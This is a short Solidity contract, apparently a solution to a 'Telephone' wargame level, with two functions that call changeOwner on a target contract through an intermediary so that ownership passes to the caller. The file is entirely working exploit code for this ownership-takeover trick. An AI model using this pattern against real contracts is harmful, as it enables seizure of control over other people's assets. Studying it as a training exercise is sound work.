pragma solidity ^0.6.0;

import "../4-telephone/Telephone.sol";

contract TelephoneAttack {

    address public owner;

    function attack1(address target) public {
        (bool success, ) =
            target.call(
                abi.encodeWithSignature("changeOwner(address)", msg.sender)
            );
        require(success, "Transaction call using encodeWithSignature is successful");
    }

    function attack2(address target) public {
        Telephone tel = Telephone(target);
        tel.changeOwner(msg.sender);
    }
}
